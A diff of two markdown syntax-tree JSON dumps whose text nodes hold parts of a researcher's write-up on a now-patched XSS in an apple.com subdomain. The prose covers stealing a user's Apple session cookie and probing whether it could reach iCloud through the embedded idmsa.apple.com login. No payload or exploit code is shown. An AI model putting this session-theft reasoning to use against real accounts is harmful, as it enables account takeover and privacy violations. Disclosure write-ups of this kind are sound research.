<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§2",
<       "label": "§2",
<       "title": null,
<       "url": "#the_very_worst_thing",
<       "position": {
<         "start": {
<           "line": 148,
<           "column": 1,
<           "offset": 7251
<         },
<         "end": {
<           "line": 148,
<           "column": 28,
<           "offset": 7278
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A few days ago when I was sick with flu and researching Apple security to\ndistract me from the aches and pains of my failing mortal body I found an XSS\ndeep in an apple.com subdomain. That's to say, I could inject some code into a\nwebsite somewhere on apple.com, which, to a user's web browser looked like it\nwas written by Apple. In such cases, my code is granted all the privilages\nassociated with Being Code That Apple Wrote inside a web browser, such as being\nable to talk to Apple servers on the user's behalf.",
<           "position": {
<             "start": {
<               "line": 150,
<               "column": 1,
<               "offset": 7282
<             },
<             "end": {
<               "line": 156,
<               "column": 52,
<               "offset": 7803
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 150,
<           "column": 1,
<           "offset": 7282
<         },
<         "end": {
<           "line": 156,
<           "column": 52,
<           "offset": 7803
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Typically, for an XSS on the subdomain ",
<           "position": {
<             "start": {
<               "line": 158,
<               "column": 1,
<               "offset": 7807
<             },
<             "end": {
<               "line": 158,
<               "column": 40,
<               "offset": 7846
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "users.bradsdrinks.com",
<           "position": {
<             "start": {
<               "line": 158,
<               "column": 40,
<               "offset": 7846
<             },
<             "end": {
<               "line": 158,
<               "column": 63,
<               "offset": 7869
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " we only get\naccess to whatever ",
<           "position": {
<             "start": {
<               "line": 158,
<               "column": 63,
<               "offset": 7869
<             },
<             "end": {
<               "line": 159,
<               "column": 20,
<               "offset": 7902
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "bradsdrinks.com",
<           "position": {
<             "start": {
<               "line": 159,
<               "column": 20,
<               "offset": 7902
<             },
<             "end": {
<               "line": 159,
<               "column": 37,
<               "offset": 7919
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " can do. Which means if Brad's Great Drinks,\nUSA owns another fine website, ",
<           "position": {
<             "start": {
<               "line": 159,
<               "column": 37,
<               "offset": 7919
<             },
<             "end": {
<               "line": 160,
<               "column": 32,
<               "offset": 7996
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "bradsbetterdrinks.com",
<           "position": {
<             "start": {
<               "line": 160,
<               "column": 32,
<               "offset": 7996
<             },
<             "end": {
<               "line": 160,
<               "column": 55,
<               "offset": 8019
1759,1820d420
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " we can't mess with that.\nFor ",
<           "position": {
<             "start": {
<               "line": 160,
<               "column": 55,
<               "offset": 8019
<             },
<             "end": {
<               "line": 161,
<               "column": 5,
<               "offset": 8050
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 161,
<               "column": 5,
<               "offset": 8050
<             },
<             "end": {
<               "line": 161,
<               "column": 16,
<               "offset": 8061
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", this means I can steal the 'apple session', which indicates who\nyou are to Apple, and do bad stuff you wouldn't want me to do, like purchase\ngifts for myself in the apple store with ",
<           "position": {
<             "start": {
<               "line": 161,
<               "column": 16,
<               "offset": 8061
<             },
<             "end": {
<               "line": 163,
<               "column": 42,
<               "offset": 8247
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
1822,1823c422,445
<               "type": "text",
<               "value": "your",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "That's fascinating to me. For most of the time I used the internet my email was\nfull of weird junk and my social media accounts had some platitudes about\nwhatever was funny online. The closest these profiles came to being 'real' was\nthe rare profile picture I might have of my face.",
>                   "position": {
>                     "start": {
>                       "line": 63,
>                       "column": 1,
>                       "offset": 2109
>                     },
>                     "end": {
>                       "line": 66,
>                       "column": 50,
>                       "offset": 2394
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
1826,1828c448,450
<                   "line": 163,
<                   "column": 43,
<                   "offset": 8248
---
>                   "line": 63,
>                   "column": 1,
>                   "offset": 2109
1831,1833c453,455
<                   "line": 163,
<                   "column": 47,
<                   "offset": 8252
---
>                   "line": 66,
>                   "column": 50,
>                   "offset": 2394
1835c457,461
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
1837,1901d462
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 163,
<               "column": 42,
<               "offset": 8247
<             },
<             "end": {
<               "line": 163,
<               "column": 48,
<               "offset": 8253
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " credit card.",
<           "position": {
<             "start": {
<               "line": 163,
<               "column": 48,
<               "offset": 8253
<             },
<             "end": {
<               "line": 163,
<               "column": 61,
<               "offset": 8266
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 158,
<           "column": 1,
<           "offset": 7807
<         },
<         "end": {
<           "line": 163,
<           "column": 61,
<           "offset": 8266
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "At this point, trying to think of the worst thing that could possibly happen\nwith this vulnerability as I often seem to be doing I thought -- well, what if I\nget into iCloud? That would be really, really terrible right?",
<           "position": {
<             "start": {
<               "line": 165,
<               "column": 1,
<               "offset": 8270
1903,1954d463
<             "end": {
<               "line": 167,
<               "column": 62,
<               "offset": 8491
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 165,
<           "column": 1,
<           "offset": 8270
<         },
<         "end": {
<           "line": 167,
<           "column": 62,
<           "offset": 8491
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "But then, I recall the oddity that icloud is ",
<           "position": {
<             "start": {
<               "line": 169,
<               "column": 1,
<               "offset": 8495
<             },
<             "end": {
<               "line": 169,
<               "column": 46,
<               "offset": 8540
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
1956,1957c465,489
<               "type": "text",
<               "value": "not",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If you hacked these accounts, or you got my computer you might mull over the\nnumber of image macros I had bookmarked, but you wouldn't really have much of an\nidea of what my life was like. Now I talk to all of my friends on a medium\nthat's recorded forever and I have every photo I ever took of my life and my\nrelationships back to 2014.",
>                   "position": {
>                     "start": {
>                       "line": 68,
>                       "column": 1,
>                       "offset": 2398
>                     },
>                     "end": {
>                       "line": 72,
>                       "column": 28,
>                       "offset": 2739
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
1960,1962c492,494
<                   "line": 169,
<                   "column": 47,
<                   "offset": 8541
---
>                   "line": 68,
>                   "column": 1,
>                   "offset": 2398
1965,1967c497,499
<                   "line": 169,
<                   "column": 50,
<                   "offset": 8544
---
>                   "line": 72,
>                   "column": 28,
>                   "offset": 2739
1969c501,506
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
1971,2100d507
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 169,
<               "column": 46,
<               "offset": 8540
<             },
<             "end": {
<               "line": 169,
<               "column": 51,
<               "offset": 8545
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " on ",
<           "position": {
<             "start": {
<               "line": 169,
<               "column": 51,
<               "offset": 8545
<             },
<             "end": {
<               "line": 169,
<               "column": 55,
<               "offset": 8549
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 169,
<               "column": 55,
<               "offset": 8549
<             },
<             "end": {
<               "line": 169,
<               "column": 66,
<               "offset": 8560
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". A rather\nsensible decision. If, for example instead of using your ",
<           "position": {
<             "start": {
<               "line": 169,
<               "column": 66,
<               "offset": 8560
<             },
<             "end": {
<               "line": 170,
<               "column": 58,
<               "offset": 8629
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 170,
<               "column": 58,
<               "offset": 8629
<             },
<             "end": {
<               "line": 170,
<               "column": 69,
<               "offset": 8640
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " session,\n",
<           "position": {
<             "start": {
<               "line": 170,
<               "column": 69,
<               "offset": 8640
<             },
<             "end": {
<               "line": 171,
<               "column": 1,
<               "offset": 8651
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "iCloud.com",
<           "position": {
<             "start": {
<               "line": 171,
<               "column": 1,
<               "offset": 8651
<             },
<             "end": {
<               "line": 171,
<               "column": 13,
<               "offset": 8663
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " used a special, iCloud specific session negotiated ",
<           "position": {
<             "start": {
<               "line": 171,
<               "column": 13,
<               "offset": 8663
2102,2105c509,552
<             "end": {
<               "line": 171,
<               "column": 65,
<               "offset": 8715
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Often discussion of this comes with a heavy-handed sense of fear that such\nthings are 'online' but that's not something I fear, or what I'm trying to draw\nattention to. To me, what's fascinating is that someone's real life history and\nidentity is online at all, that between me and knowing everything about you are\na few security systems.",
>                   "position": {
>                     "start": {
>                       "line": 74,
>                       "column": 1,
>                       "offset": 2743
>                     },
>                     "end": {
>                       "line": 78,
>                       "column": 24,
>                       "offset": 3085
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 74,
>                   "column": 1,
>                   "offset": 2743
>                 },
>                 "end": {
>                   "line": 78,
>                   "column": 24,
>                   "offset": 3085
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
2107,2112d553
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
2114,2115c555,629
<               "type": "text",
<               "value": "with",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "When, in 2014 \"a collection of almost 500 private pictures of various celebrities, mostly women, and with many containing nudity, were posted on the imageboard 4chan ... initially believed to have been obtained via a breach of Apple's cloud services suite iCloud\" (",
>                   "position": {
>                     "start": {
>                       "line": 80,
>                       "column": 1,
>                       "offset": 3089
>                     },
>                     "end": {
>                       "line": 80,
>                       "column": 266,
>                       "offset": 3354
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "linkReference",
>                   "identifier": "1",
>                   "label": "1",
>                   "referenceType": "full",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "wiki",
>                       "position": {
>                         "start": {
>                           "line": 80,
>                           "column": 267,
>                           "offset": 3355
>                         },
>                         "end": {
>                           "line": 80,
>                           "column": 271,
>                           "offset": 3359
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 80,
>                       "column": 266,
>                       "offset": 3354
>                     },
>                     "end": {
>                       "line": 80,
>                       "column": 275,
>                       "offset": 3363
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ") -- I had this realisation that the people whose lives were 'online' weren't the people who sent sexts over MySpace chat anymore, it was everyone. Like hacking someone's 'Cyberbrain' in Ghost In The Shell, hacking someone's personal cloud storage was like peering directly into their life and seeing it from their eyes.",
>                   "position": {
>                     "start": {
>                       "line": 80,
>                       "column": 275,
>                       "offset": 3363
>                     },
>                     "end": {
>                       "line": 80,
>                       "column": 595,
>                       "offset": 3683
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
2118,2120c632,634
<                   "line": 171,
<                   "column": 66,
<                   "offset": 8716
---
>                   "line": 80,
>                   "column": 1,
>                   "offset": 3089
2123,2125c637,639
<                   "line": 171,
<                   "column": 70,
<                   "offset": 8720
---
>                   "line": 80,
>                   "column": 595,
>                   "offset": 3683
2129,2460d642
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 171,
<               "column": 65,
<               "offset": 8715
<             },
<             "end": {
<               "line": 171,
<               "column": 71,
<               "offset": 8721
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\n",
<           "position": {
<             "start": {
<               "line": 171,
<               "column": 71,
<               "offset": 8721
<             },
<             "end": {
<               "line": 172,
<               "column": 1,
<               "offset": 8723
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 172,
<               "column": 1,
<               "offset": 8723
<             },
<             "end": {
<               "line": 172,
<               "column": 12,
<               "offset": 8734
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " requiring your username and password input then hacking the much\nlarger and thus easier to attack ",
<           "position": {
<             "start": {
<               "line": 172,
<               "column": 12,
<               "offset": 8734
<             },
<             "end": {
<               "line": 173,
<               "column": 34,
<               "offset": 8834
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 173,
<               "column": 34,
<               "offset": 8834
<             },
<             "end": {
<               "line": 173,
<               "column": 45,
<               "offset": 8845
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " wouldn't leak my nudes.",
<           "position": {
<             "start": {
<               "line": 173,
<               "column": 45,
<               "offset": 8845
<             },
<             "end": {
<               "line": 173,
<               "column": 69,
<               "offset": 8869
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 169,
<           "column": 1,
<           "offset": 8495
<         },
<         "end": {
<           "line": 173,
<           "column": 69,
<           "offset": 8869
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I never truly verified if this is the case -- that is, whether I can derive an\niCloud session from an ",
<           "position": {
<             "start": {
<               "line": 175,
<               "column": 1,
<               "offset": 8873
<             },
<             "end": {
<               "line": 176,
<               "column": 24,
<               "offset": 8976
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 176,
<               "column": 24,
<               "offset": 8976
<             },
<             "end": {
<               "line": 176,
<               "column": 35,
<               "offset": 8987
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " session. But I did get a hankering to\ninvestigate, and my investigation proved a lot of my intuition correct at least.",
<           "position": {
<             "start": {
<               "line": 176,
<               "column": 35,
<               "offset": 8987
<             },
<             "end": {
<               "line": 177,
<               "column": 81,
<               "offset": 9107
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 175,
<           "column": 1,
<           "offset": 8873
<         },
<         "end": {
<           "line": 177,
<           "column": 81,
<           "offset": 9107
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "thematicBreak",
<       "position": {
<         "start": {
<           "line": 179,
<           "column": 1,
<           "offset": 9111
<         },
<         "end": {
<           "line": 179,
<           "column": 81,
<           "offset": 9191
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A telltale oddity on ",
<           "position": {
<             "start": {
<               "line": 181,
<               "column": 1,
<               "offset": 9195
<             },
<             "end": {
<               "line": 181,
<               "column": 22,
<               "offset": 9216
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 181,
<               "column": 22,
<               "offset": 9216
<             },
<             "end": {
<               "line": 181,
<               "column": 34,
<               "offset": 9228
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ": if I am logged into ",
<           "position": {
<             "start": {
<               "line": 181,
<               "column": 34,
<               "offset": 9228
<             },
<             "end": {
<               "line": 181,
<               "column": 56,
<               "offset": 9250
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 181,
<               "column": 56,
<               "offset": 9250
<             },
<             "end": {
<               "line": 181,
<               "column": 67,
<               "offset": 9261
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", and I try to\nlog into ",
<           "position": {
<             "start": {
<               "line": 181,
<               "column": 67,
<               "offset": 9261
<             },
<             "end": {
<               "line": 182,
<               "column": 10,
<               "offset": 9286
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 182,
<               "column": 10,
<               "offset": 9286
<             },
<             "end": {
<               "line": 182,
<               "column": 22,
<               "offset": 9298
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", the login dialog presents my email on the email line\nwithout my ever entering it. How is this possible? Well, it turns out that the\napple login system is located at ",
<           "position": {
<             "start": {
<               "line": 182,
<               "column": 22,
<               "offset": 9298
2462,2509d643
<             "end": {
<               "line": 184,
<               "column": 34,
<               "offset": 9467
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 184,
<               "column": 34,
<               "offset": 9467
<             },
<             "end": {
<               "line": 184,
<               "column": 51,
<               "offset": 9484
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and is ",
<           "position": {
<             "start": {
<               "line": 184,
<               "column": 51,
<               "offset": 9484
<             },
<             "end": {
<               "line": 184,
<               "column": 59,
<               "offset": 9492
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
2511,2512c645,649
<               "type": "text",
<               "value": "embedded",
---
>               "type": "definition",
>               "identifier": "1",
>               "label": "1",
>               "title": null,
>               "url": "https://en.wikipedia.org/wiki/ICloud_leaks_of_celebrity_photos",
2515,2517c652,654
<                   "line": 184,
<                   "column": 60,
<                   "offset": 9493
---
>                   "line": 82,
>                   "column": 1,
>                   "offset": 3687
2520c657
<                   "line": 184,
---
>                   "line": 82,
2522c659
<                   "offset": 9501
---
>                   "offset": 3754
2526,2585d662
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 184,
<               "column": 59,
<               "offset": 9492
<             },
<             "end": {
<               "line": 184,
<               "column": 69,
<               "offset": 9502
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " into\nicloud. Since ",
<           "position": {
<             "start": {
<               "line": 184,
<               "column": 69,
<               "offset": 9502
<             },
<             "end": {
<               "line": 185,
<               "column": 15,
<               "offset": 9523
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 185,
<               "column": 15,
<               "offset": 9523
<             },
<             "end": {
<               "line": 185,
<               "column": 32,
<               "offset": 9540
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " inherits the ",
<           "position": {
<             "start": {
<               "line": 185,
<               "column": 32,
<               "offset": 9540
2587,2624c664,701
<             "end": {
<               "line": 185,
<               "column": 46,
<               "offset": 9554
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "*.apple.com",
<           "position": {
<             "start": {
<               "line": 185,
<               "column": 46,
<               "offset": 9554
<             },
<             "end": {
<               "line": 185,
<               "column": 59,
<               "offset": 9567
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " session cookie, it\nalready knows my email. By the looks of it though, it needs my confirmation to\ngrant a special iCloud session so I can log into my iCloud. Which is a pretty\nsensible decision, as previously mentioned.",
<           "position": {
<             "start": {
<               "line": 185,
<               "column": 59,
<               "offset": 9567
<             },
<             "end": {
<               "line": 188,
<               "column": 44,
<               "offset": 9790
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "In this article I'll be describing and demonstrating to the best of my ability a\nnow patched series of exploits on the Apple identity systems idmsa.apple.com.",
>                   "position": {
>                     "start": {
>                       "line": 84,
>                       "column": 1,
>                       "offset": 3758
>                     },
>                     "end": {
>                       "line": 85,
>                       "column": 78,
>                       "offset": 3917
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 84,
>                   "column": 1,
>                   "offset": 3758
>                 },
>                 "end": {
>                   "line": 85,
>                   "column": 78,
>                   "offset": 3917
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
2626,2666c703,742
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 181,
<           "column": 1,
<           "offset": 9195
<         },
<         "end": {
<           "line": 188,
<           "column": 44,
<           "offset": 9790
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We've all embedded something before. Come to think of it, I ",
<           "position": {
<             "start": {
<               "line": 190,
<               "column": 1,
<               "offset": 9794
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "There's a particular framework in which I want such issues to be understood,\nthough. It's an angle on my understanding of the context of issues I find that\nI've thought a lot about, but never tried to write down before.",
>                   "position": {
>                     "start": {
>                       "line": 87,
>                       "column": 1,
>                       "offset": 3921
>                     },
>                     "end": {
>                       "line": 89,
>                       "column": 64,
>                       "offset": 4142
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 87,
>                   "column": 1,
>                   "offset": 3921
>                 },
>                 "end": {
>                   "line": 89,
>                   "column": 64,
>                   "offset": 4142
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
2668,2671c744,893
<             "end": {
<               "line": 190,
<               "column": 61,
<               "offset": 9854
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Over the years as I've grown and matured the stuff I've hacked has only grown in\nimpact. Consider, for example my ",
>                   "position": {
>                     "start": {
>                       "line": 91,
>                       "column": 1,
>                       "offset": 4146
>                     },
>                     "end": {
>                       "line": 92,
>                       "column": 34,
>                       "offset": 4261
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "linkReference",
>                   "identifier": "2",
>                   "label": "2",
>                   "referenceType": "full",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "2017 hack of a nation's tax system",
>                       "position": {
>                         "start": {
>                           "line": 92,
>                           "column": 35,
>                           "offset": 4262
>                         },
>                         "end": {
>                           "line": 92,
>                           "column": 69,
>                           "offset": 4296
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 92,
>                       "column": 34,
>                       "offset": 4261
>                     },
>                     "end": {
>                       "line": 92,
>                       "column": 73,
>                       "offset": 4300
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". When\npeople hear about this stuff, the first thing they think is 'oh no! what if it\nhappened to me'. And they think about how ",
>                   "position": {
>                     "start": {
>                       "line": 92,
>                       "column": 73,
>                       "offset": 4300
>                     },
>                     "end": {
>                       "line": 94,
>                       "column": 43,
>                       "offset": 4430
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "bad",
>                       "position": {
>                         "start": {
>                           "line": 94,
>                           "column": 44,
>                           "offset": 4431
>                         },
>                         "end": {
>                           "line": 94,
>                           "column": 47,
>                           "offset": 4434
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 94,
>                       "column": 43,
>                       "offset": 4430
>                     },
>                     "end": {
>                       "line": 94,
>                       "column": 48,
>                       "offset": 4435
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " security must be to get there.",
>                   "position": {
>                     "start": {
>                       "line": 94,
>                       "column": 48,
>                       "offset": 4435
>                     },
>                     "end": {
>                       "line": 94,
>                       "column": 79,
>                       "offset": 4466
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 91,
>                   "column": 1,
>                   "offset": 4146
>                 },
>                 "end": {
>                   "line": 94,
>                   "column": 79,
>                   "offset": 4466
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
2673,2678d894
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
2680,2681c896,900
<               "type": "text",
<               "value": "hope",
---
>               "type": "definition",
>               "identifier": "2",
>               "label": "2",
>               "title": null,
>               "url": "https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b",
2684,2686c903,905
<                   "line": 190,
<                   "column": 62,
<                   "offset": 9855
---
>                   "line": 96,
>                   "column": 1,
>                   "offset": 4470
2689,2691c908,910
<                   "line": 190,
<                   "column": 66,
<                   "offset": 9859
---
>                   "line": 96,
>                   "column": 82,
>                   "offset": 4551
2695,2706d913
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 190,
<               "column": 61,
<               "offset": 9854
<             },
<             "end": {
<               "line": 190,
<               "column": 67,
<               "offset": 9860
2708,2718c915,1063
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " we've all\nembedded something before. Not so many people pasting embed code into their\npersonal websites these days I guess. That's probably a good thing (not you,\nGoogle Tag Manager!!).",
<           "position": {
<             "start": {
<               "line": 190,
<               "column": 67,
<               "offset": 9860
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "That's something that I think is maybe even harmful to the general public's\nunderstanding of security. It puts all vulnerabilities on the same table. In\nreality, I see vulnerabilities as running along this asymtotic curve of\n",
>                   "position": {
>                     "start": {
>                       "line": 98,
>                       "column": 1,
>                       "offset": 4555
>                     },
>                     "end": {
>                       "line": 101,
>                       "column": 1,
>                       "offset": 4783
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "complexity",
>                       "position": {
>                         "start": {
>                           "line": 101,
>                           "column": 2,
>                           "offset": 4784
>                         },
>                         "end": {
>                           "line": 101,
>                           "column": 12,
>                           "offset": 4794
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 101,
>                       "column": 1,
>                       "offset": 4783
>                     },
>                     "end": {
>                       "line": 101,
>                       "column": 13,
>                       "offset": 4795
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " vs ",
>                   "position": {
>                     "start": {
>                       "line": 101,
>                       "column": 13,
>                       "offset": 4795
>                     },
>                     "end": {
>                       "line": 101,
>                       "column": 17,
>                       "offset": 4799
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "impact",
>                       "position": {
>                         "start": {
>                           "line": 101,
>                           "column": 18,
>                           "offset": 4800
>                         },
>                         "end": {
>                           "line": 101,
>                           "column": 24,
>                           "offset": 4806
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 101,
>                       "column": 17,
>                       "offset": 4799
>                     },
>                     "end": {
>                       "line": 101,
>                       "column": 25,
>                       "offset": 4807
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". It's the landscape representing all the bugs that are\nout there.",
>                   "position": {
>                     "start": {
>                       "line": 101,
>                       "column": 25,
>                       "offset": 4807
>                     },
>                     "end": {
>                       "line": 102,
>                       "column": 11,
>                       "offset": 4874
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 98,
>                   "column": 1,
>                   "offset": 4555
>                 },
>                 "end": {
>                   "line": 102,
>                   "column": 11,
>                   "offset": 4874
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
2720,2723c1065,1165
<             "end": {
<               "line": 193,
<               "column": 23,
<               "offset": 10049
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
